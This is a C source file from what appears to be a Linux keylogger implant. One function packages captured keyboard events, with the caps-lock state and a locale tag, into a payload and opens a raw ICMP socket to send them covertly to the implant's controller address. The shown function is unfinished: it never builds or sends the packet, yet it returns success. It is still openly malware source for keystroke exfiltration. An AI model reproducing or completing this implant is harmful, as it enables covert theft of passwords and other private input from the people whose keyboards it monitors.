
#include <linux/input.h>

#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <stdio.h>
#include <unistd.h>
#include "implant.h"

/* Layout of the DATA packet is following
 * [ Locale (length: 31), using_cap_lock, struct input_event dump ]
 */
int send_key_icmp(implant_t *implant, struct input_event event) {

    char payload[sizeof(struct input_event) + 32] = {0};

    /* for the userland implant, we will always assume the locale is
     * US, because I haven't yet found a way to hook evdev driver from here
     * and recover translated keys. Alternative would be to use something like
     * libxkbcommon but this means we cannot compile statically, which is something
     * that i want.
     *
     * If you want to have translated keys, for now you must use the kernel
     * module in the kernel/ directory. it will respect the same protocol
     * and be able to retrieve the information that you want.
     */
    strncpy(payload, "us", 2);
    payload[31] = implant->using_caps_lock;
    memccpy(payload + 32, &event, 0, sizeof(struct input_event));

    /* set up ICMP socket */
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not load ICMP socket\n");
        perror("socket");
#endif

cleanup_error:
        close(sockfd);
        return ERROR;
    }

    int enabled = 1;
    if (setsockopt(sockfd, IPPROTO_IP,
        IP_HDRINCL,
        (const char *)&enabled,
        sizeof(enabled)) == -1) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not set ICMP socket options\n");
        perror("setsockopt");
#endif

        goto cleanup_error;
    }

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                  &enabled,
                  sizeof(int)
                  ) < 0) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not set ICMP socket options\n");
        perror("setsockopt");
#endif

        goto cleanup_error;
    }

    /* set packet metadata */

    /* TODO(djnn): retrieve IP address */
    char local_ip[32] = "127.0.0.1";
    int packet_type = ICMP_ECHOREPLY;

    struct iphdr *ip = NULL;
    struct icmphdr *icmp = NULL;
    struct in_addr src_addr = {0};
    struct in_addr dest_addr = {0};

    inet_pton(AF_INET, local_ip, &src_addr);
    inet_pton(AF_INET, implant->ip, &dest_addr);



    return SUCCESSFUL;
}

